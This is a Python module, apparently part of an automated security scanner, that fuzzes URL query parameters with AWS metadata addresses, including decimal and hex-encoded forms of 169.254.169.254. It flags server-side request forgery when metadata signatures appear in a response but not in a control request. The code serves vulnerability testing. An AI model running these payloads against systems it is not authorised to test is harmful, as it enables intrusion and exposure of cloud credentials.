from urllib.parse import parse_qsl

import requests

from . import utils


METADATA_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://2852039166/latest/meta-data/",
    "http://0xA9FEA9FE/latest/meta-data/",
]
AWS_SIGNATURES = ("ami-id", "instance-id")


def _metadata_response(response):
    if not response or not 200 <= response.status_code < 300:
        return False
    body = response.text.lower()
    content_type = response.headers.get("Content-Type", "").lower()
    return ("text/html" not in content_type
            and not body.lstrip().startswith("<html")
            and all(signature in body for signature in AWS_SIGNATURES))


def run_cloud_ssrf_fuzzer(url):
    """Find AWS metadata SSRF with control-response and signature checks."""
    findings = []
    if "?" not in url:
        return findings

    headers = {"User-Agent": "Aegis-Auto/CloudSSRF"}
    if utils.GLOBAL_COOKIE:
        headers["Cookie"] = utils.GLOBAL_COOKIE
    if utils.GLOBAL_BEARER:
        headers["Authorization"] = f"Bearer {utils.GLOBAL_BEARER}"

    from urllib.parse import urlparse, urlunparse
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return findings
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", parsed.fragment))

    for index, (key, _original_value) in enumerate(params):
        control_params = params.copy()
        control_params[index] = (key, "https://example.com")
        try:
            control = requests.get(base_url, params=control_params, headers=headers,
                                   timeout=5, verify=False)
        except requests.RequestException:
            control = None

        for payload in METADATA_PAYLOADS:
            test_params = params.copy()
            test_params[index] = (key, payload)
            try:
                response = requests.get(base_url, params=test_params, headers=headers,
                                        timeout=5, verify=False)
            except requests.RequestException:
                continue

            if _metadata_response(response) and not _metadata_response(control):
                findings.append({
                    "type": "CLOUD_METADATA_SSRF",
                    "url": response.url,
                    "parameter": key,
                    "severity": "CRITICAL",
                    "confidence": "HIGH",
                    "verified": True,
                    "verification_method": "metadata-signature-with-control",
                    "verification_evidence": {
                        "deterministic": True,
                        "provider": "AWS",
                        "payload": payload,
                        "status": response.status_code,
                        "content_type": response.headers.get("Content-Type", ""),
                        "required_signatures": list(AWS_SIGNATURES),
                        "control_signature_absent": True,
                    },
                    "detail": (f"AWS metadata signatures appeared only after injecting the metadata URL "
                               f"into parameter `{key}`."),
                })
                return findings

    return findings
